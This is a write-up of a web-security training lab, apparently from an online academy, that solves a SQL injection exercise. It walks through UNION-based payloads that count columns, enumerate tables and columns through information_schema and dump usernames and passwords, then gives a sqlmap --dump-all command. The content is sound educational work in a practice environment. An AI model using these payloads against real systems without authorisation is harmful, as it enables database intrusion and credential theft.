## SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

Hint :

You can find some useful payloads on our SQL injection cheat sheet.

## Notes

- /login
- `filter?category=parameter`

## Resume

1. Find the number of columns
2. Find a reflected column
3. Enumerate database tables
4. Enumerate table columns
5. Dump usernames and passwords
6. Login as administrator

## Solve

First, determine the number of columns used by the query.

Trying with 3 columns :

```
' UNION SELECT NULL,NULL,NULL-- -
```

returns :

```
Internal Server Error
```

Retrying with 2 columns :

```
' UNION SELECT NULL,NULL-- -
```

works correctly, confirming that the query contains **2 columns**.

Next, determine which column reflects data using the database version :

```
' UNION SELECT NULL,version()-- -
```

and :

```
' UNION SELECT version(),NULL-- -
```

Both payloads display the database version inside the response.

Now enumerate all tables from the database :

```
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
```

Among the returned tables, a users table is identified :

```
users_kqtwhl
```

The next step is to enumerate the columns from this table :

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_kqtwhl'-- -
```

This returns the following columns :

- `password_ztiido`
- `email`
- `username_slarbh`

Now dump usernames :

```
' UNION SELECT username_slarbh,NULL FROM users_kqtwhl-- -
```

Returned users :

- `carlos`
- `wiener`
- `administrator`

Then dump passwords :

```
' UNION SELECT password_ztiido,NULL FROM users_kqtwhl-- -
```

Returned passwords :

```
0l6qhdg8akeup1gbql5z
6a19log4ujseffexfaw7
tvaqlwejl8clyv845le8
```

Administrator credentials :

```
administrator:6a19log4ujseffexfaw7
```

Login using these credentials to solve the lab.


Using sqlmap : 

```bash
sqlmap -u 'https://0a3300840468f01a80355d05007500e2.web-security-academy.net/filter?category=' --dump-all
```